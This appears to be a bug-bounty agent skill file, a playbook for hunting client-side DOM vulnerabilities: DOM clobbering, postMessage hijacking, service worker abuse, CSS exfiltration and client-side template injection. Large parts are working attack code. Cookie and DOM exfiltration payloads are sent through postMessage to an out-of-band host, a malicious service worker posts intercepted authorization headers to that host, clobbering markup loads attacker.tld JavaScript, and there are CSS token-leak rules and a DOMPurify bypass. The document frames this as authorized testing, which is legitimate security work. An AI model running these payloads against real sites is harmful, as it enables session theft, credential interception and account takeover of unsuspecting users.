# Upstream source: dom (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/dom/SKILL.md`

---

---
name: dom
description: "Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction."
---

# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil

## Crown Jewel Targets

DOM-based attacks execute in the victim's browser — the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.

**Highest-value chains:**
- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.

### Grounding — public research this is distilled from
- **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
> Cite only what you reproduce. Do not paste these as "proof" in a report — your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.

---

## Attack Surface Signals

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

---

## Phase 1 — DOM Clobbering

```bash
# Signal: app reads element IDs/names as if they were JS objects, OR feeds a
# clobberable global into a sink (location, innerHTML, eval, script.src).
# Inject MARKUP (no script) at a sink that lets named/id'd elements through.

# Single-level clobber of window.config:
#   <a id="config" href="https://evil.com">
# Clobber a NON-built-in global the app reads (built-in methods like getElementById can't be shadowed this way):
#   <a id="config"></a><a id="config" name="url">   # window.config.url resolves to an attacker-controlled element/string
# Clobber a string-coerced URL value (anchor toString() == href):
#   <a id="x"></a><a id="x" name="y" href="https://evil.com">   # x.y -> href
# Nested window.a.b.c via form/inputs:
#   <form id="a"><input id="b" name="c" value="clobbered"></form>
# baseURI / relative-URL hijack:
#   <base href="https://evil.com/">      # bends every relative src/href
```

```javascript
// Browser console: find globals that are clobberable AND reach a sink.
// A var only matters if the app later concatenates it into a URL/HTML/eval.
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];
susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);
});
```

```bash
# Source review: find globals fed into sinks (this is what makes clobbering exploitable)
curl -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
# DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable sources→sinks.
```

**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`.

---

## Phase 2 — PostMessage Hijacking

Two bug classes: (a) **listener** trusts cross-origin data → drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` → any framing page reads them.

```bash
# Find handlers and flag the ones with NO origin check
grep -rnE "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -vE "\.origin\b" 
# Then for each, read +/- 20 lines: where does event.data go? (innerHTML/eval/location/token store)
# Senders that leak: grep for postMessage(<secret>, '*')
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/$TARGET/ --include="*.js" 2>/dev/null
```

```html
<!-- PoC A: drive a no-origin-check LISTENER from an attacker page -->
<!-- Host on attacker.com; frames target and pushes a privileged message -->
<iframe id="f" src="https://TARGET/page-with-listener"></iframe>
<script>
  document.getElementById('f').onload = () => {
    const w = document.getElementById('f').contentWindow;
    // Shape the payload to whatever the handler routes into a sink:
    w.postMessage({type:'navigate', url:'javascript:fetch("https://OOB/x?c="+document.cookie)'}, '*');
    w.postMessage('<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>', '*');
  };
</script>
```

```html
<!-- PoC B: capture secrets from a SENDER that uses targetOrigin '*' -->
<iframe id="f" src="https://TARGET/sso-or-widget" style="display:none"></iframe>
<pre id="out"></pre>
<script>
addEventListener('message', e => {
  // Only count it if e.origin is the TARGET and data carries a secret
  out.textContent += `origin=${e.origin}\ndata=${JSON.stringify(e.data)}\n---\n`;
  if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))
    fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data))); // OOB proof
});
</script>
```

> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable — bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.

---

### PostMessage handler race — win the message before origin is set
Beyond static origin/sender checks: some handlers trust the FIRST message, or read `event.origin` while it is still `""`/`null` during frame load. Race it — flood `postMessage` in a tight loop during iframe/popup load, or fire from `about:blank` before navigation, so your message lands before the legit sender or before strict origin setup runs. Test any handler that assumes "first message = trusted". Disclosed: reports/381356.

## Phase 3 — Service Worker Abuse

**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.

So the realistic path is: get a SW script **onto the target origin** (file upload that serves JS, open-redirect/path the origin reflects as a script, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.

```bash
# Enumerate existing SW + its scope
curl -s "https://$TARGET/" | grep -iE "serviceWorker\.register|navigator\.serviceWorker"
for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://$TARGET/$p"; done
curl -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|caches"
# Look for an upload/route that returns Content-Type: text/javascript on YOUR content:
#   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
```

```javascript
// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN (e.g. /uploads/evil-sw.js
// served by the target). scope must be <= the directory the script is served from
// unless the response carries Service-Worker-Allowed.
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
  .then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof of registration
  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope

// evil-sw.js (served from the TARGET origin):
self.addEventListener('fetch', e => {
  e.respondWith(fetch(e.request.clone()).then(async resp => {
    // Exfil URL + any auth header the page attaches, to OOB
    fetch('https://OOB/sw-intercept', {method:'POST',
      body: JSON.stringify({url: e.request.url,
        auth: e.request.headers.get('authorization')})});
    return resp;
  }));
});
```

> Persistence note: a SW survives tab close and re-runs on next visit within scope — that is what makes it Critical. Confirm persistence by closing all tabs, reopening the origin, and showing a fresh OOB hit with no XSS re-trigger.

---

## Phase 4 — CSS Injection / Exfiltration

```bash
# Prereq: attacker controls CSS (custom-theme field, style= passthrough, email
# template, markdown CSS). Targets: hidden CSRF input, API key in meta, nonce attr.
# Step 1 confirm injection: inject "color:red" on a known element, observe render.
# Step 2 leak attribute values char-by-char via attribute selectors + url() to OOB.
```

> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution* — it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.

```css
/* One request fires only for the matching first char. */
input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
meta[name="csrf-token"][content^="a"] { background: url(https://OOB.example/c?m=a); }
```

```python
# Generate a single-position CSS exfil set (loop positions with sequential @import in practice)
import string
chars = string.ascii_letters + string.digits + '-_'
attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
print("\n".join(
  f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))
# Real exfil needs recursion: serve a stylesheet whose @import pulls the next
# position's rules only after the current prefix matched (d0nut technique) —
# this removes the "static input, one char" limitation.
```

> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the real token, then demonstrate using that token in a state-changing CSRF request. No OOB callback = no finding (a 0-byte image or CSP-blocked request looks identical to success in DevTools).

---

## Phase 5 — dangerouslySetInnerHTML / framework sinks

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
# In minified Next/React bundles:
curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -oP 'dangerouslySetInnerHTML.{0,120}'
# Trace whether user data reaches it WITHOUT a sanitizer (DOMPurify/sanitize-html).
# If DOMPurify IS present, check for clobbering/mXSS bypass (Bentkowski research) and version.
```

---

## Phase 6 — Client-Side Template Injection

```bash
# Detect framework, then test the {{}} sink in a sandbox-bypass form.
grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/$TARGET/ --include="*.js" 2>/dev/null | head
# Probe (server may render, so confirm it's CLIENT-side by viewing rendered DOM, not curl):
#   {{7*7}}  -> 49 in the live DOM (not in raw HTML) => CSTI
# AngularJS sandbox-escape style payloads (version-dependent; older 1.x):
#   {{constructor.constructor('alert(document.domain)')()}}
# Vue: {{_c.constructor('alert(1)')()}}    (varies by Vue 2/3 build)
```

---

## Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |

---

## Tools

```bash
# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
# postMessage-tracker — Chrome extension logging cross-window messages
# Burp Collaborator / interactsh / request-bin — MANDATORY OOB sink for CSS-exfil & SW PoCs
# Verify any tool URL before citing it in a report; do not paste unverified repo links.
```

---

## Validation (false-positive discipline)

Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.

- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.

**Severity:**
- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM Clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the chained CSRF is account-critical)

## Web-Research Methodology Additions (2026)

Research basis: HackTricks "DOM Clobbering" (full primitive catalog, DOMPurify `cid:` bypass, HTMLCollection-backed config clobbering) and PortSwigger Web Security Academy "Controlling the web message source" (postMessage origin-verification failures). These deepen the existing phases; they don't replace them.

### A. Discovery checklist — concrete places, params, headers, flows to look

- **Clobberable element set:** only `embed`, `form`, `iframe`, `img`/`image`, `object` can contribute a `name`-based global. `id` on any element contributes a named property on `window`/`document` — duplicate `id`s create an `HTMLCollection`.
- **Dangerous read patterns:** `window.someObject || {}` where the object is later fed to `script.src`, `iframe.src`, `fetch()`, a redirect, or `innerHTML`. Also `document.cookie`, `document.body`, `document.children`, `document.querySelector`, and `getElementById` results.
- **Overriding `getElementById`/`querySelector`:** inject `<html id="X">` or `<body id="X">` with the same id as a hidden legit element; inside SVG use `<foreignobject><html id="X">`, or `<svg><body id="X">` for Chrome/Firefox. Use CSS to hide surrounding text so `innerText` is clean.
- **Attribute clobbering against sanitizers:** filters looping over `.attributes` can be broken by `<form id=x><input id=attributes>`; `nodeName`, `tagName`, `parentNode` are clobberable too.
- **Form hijacking:** the `form="other-form-id"` attribute adds hidden fields and submit buttons to an existing form (`formaction`, `formmethod`).
- **postMessage surface:** `addEventListener('message', ...)` / `onmessage`, where `event.data` flows to `innerHTML`/`eval`/`location`/script src; and senders calling `postMessage(secret, '*')`. Audit `indexOf`/`startsWith`/`endsWith`/`includes`/prefix-regex checks.
- **DOMPurify:** check version; the `cid:` protocol trick and mXSS/clobbering bypasses are version-sensitive.
- **Escalation surface:** if injection only renders in your own profile/draft (self-XSS), look for IDOR/BOLA, shared objects, or predictable session cookies that let the same payload render for a victim/admin.
- **Tooling:** DOM Invader (canary injection into sources, postMessage auto-mutate, "Attack types → DOM clobbering"), `postMessage-tracker`, an OOB Collaborator.

- **Sink-first inventory:** grep bundles for `script.src=`, `iframe.src=`, `innerHTML=`, `eval(`, `new Function(`, `fetch(`, `location=` and trace back to any `window.X || {}` or `getElementById` read.
- **Config-object naming:** search for globals like `defaultAvatar`, `PixelAnalyticsConfig`, `config`, `settings`, `cdnDomain` — real-world clobbering targets are analytics/ad/CDN config objects.
- **Duplicate-ID scan:** count repeated `id` values in the rendered DOM; duplicates create `HTMLCollection` objects with named properties.
- **Sanitizer interaction:** if DOMPurify is present, confirm which tags/attributes it keeps — clobbering needs `id`/`name` to survive.
- **postMessage origin logic:** pull the exact comparison (`indexOf`, `includes`, `endsWith`, regex, `=== window.origin`, `=== window.location.origin`) — each has a different bypass.
- **Sender-origin audit:** list every `postMessage(x, '*')` and what it sends (tokens, codes, session data).
- **OOB setup:** have a Collaborator/interactsh listener ready before testing CSS exfil or SW interception — evidence is callback-based.
- **HTML-injection precondition:** clobbering needs markup reflection with `id`/`name` preserved — confirm `<a id=x>` survives the app's filter before investing in a chain.
- **Deep-chain timeouts:** when using `iframe srcdoc` chains, add an `@import` delay or the property resolves to `undefined`.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **String coercion via anchor:** `<a id=x href="controlled string"></a>` — `x` stringifies to its `href`, unlike a form which stringifies to `[object HTMLFormElement]`. This is what makes URL sinks exploitable.
- **Nested properties:** `x.y` via two same-id anchors with `name="y"`; `x.y.z` via `<form id=x name=y><input id=z value="controlled"></form>` plus a second `<form id=x>`; deeper paths via `iframe srcdoc` chains, using `@import "https://..."` to give the iframe time to render (otherwise `undefined`).
- **HTMLCollection config clobbering — remote script loader:**
  `<a id="PixelAnalyticsConfig"></a><a id="PixelAnalyticsConfig" name="enabled"></a><a id="PixelAnalyticsConfig" name="scriptUrl" href="https://attacker.tld/xss.js"></a>`
  The app's `window.PixelAnalyticsConfig || {}` becomes truthy, `.enabled` truthy, and `script.src = config.scriptUrl` coerces the anchor to its `href`, loading attacker JS. Works whenever code checks truthiness rather than types and CSP permits the origin.
- **DOMPurify `cid:` bypass (PortSwigger lab shape):** `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">` — DOMPurify does not URL-encode double quotes in `cid:`, so the `&quot;` decodes at runtime and escapes the attribute into an `onerror` handler.
- **postMessage weak checks:** `e.origin.indexOf('target.com')>-1` → `https://target.com.attacker.tld`; `endsWith('target.com')` → `https://malicioustarget.com`; prefix regex `/^https:\/\/payments\.example\.com/` → `payments.example.com.attacker.tld`. Intigriti and Synack both show real cases feeding `location.href`/script src.
- **Null-origin postMessage:** a handler comparing `e.origin === window.origin` is bypassable with a sandboxed iframe — both become `"null"`. Strict equality against a *literal* allowlist (or `window.location.origin`) is required.
- **First-message race:** handlers that trust the first message can be won by flooding `postMessage` during frame load or firing from `about:blank` before navigation.
- **jQuery angle:** bundles < 3.5.0 (CVE-2020-11022/11023) mutate attacker markup in `.html()`/`.append()` into executing code; confirm version before claiming it.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Clobbering:** a clobberable global that never reaches a sink is not a finding. Show the clobbered value actually reaching `script.src`/`location`/`innerHTML` and executing or navigating. Check `script-src` CSP — if the attacker origin is blocked, say so.
- **postMessage:** distinguish *missing* from *weak* origin checks; prove the weak one by serving from a look-alike/null origin and capturing a privileged action or token via OOB. A noisy message log alone is not proof.
- **Self-XSS:** must show a second principal (victim/admin) rendering the stored payload, via IDOR or shared-object access.
- **CSS exfil / SW (existing phases):** OOB callback per character and same-origin script registration remain the proof bars; re-read CSP before claiming either.
- **General:** body-diff the **rendered DOM**, not raw HTML; use unique per-test canaries (`btoa(domain)+nonce`) so OOB hits are attributable. Cite research as technique provenance only — your live PoC is the evidence.

- **Rendered-DOM diff:** capture `document.body.innerHTML` before/after, not just the raw response — these payloads are client-side.
- **Sink-reaching proof:** for a clobbered config, show the actual network request to attacker JS or the navigation, not just that `window.X` is an HTMLCollection.
- **CSP check:** read `script-src`/`img-src`/`connect-src` before claiming clobbering-loaded JS or CSS exfil; a locked-down CSP kills both.
- **postMessage proof:** show the privileged action or token exfil via OOB, and show the request originating from your look-alike/null origin.
- **Null-origin proof:** capture `e.origin === 'null'` in the handler and show the sandbox attribute that caused it.
- **SW persistence:** close all tabs, reopen, and show a fresh OOB hit with no XSS re-trigger — otherwise it's not persistent.
- **CSS exfil proof:** OOB hit per correct character forming a real token, then use that token in a state-changing request.
- **Self-XSS guard:** if only you can see the injected markup, prove a victim/admin renders it (IDOR/shared object) before reporting.
- **Attribution markers:** use a unique canary in every OOB URL so background traffic can't be mistaken for your callback.

### D. Sources — numbered list of URLs you actually fetched

1. https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html
2. https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
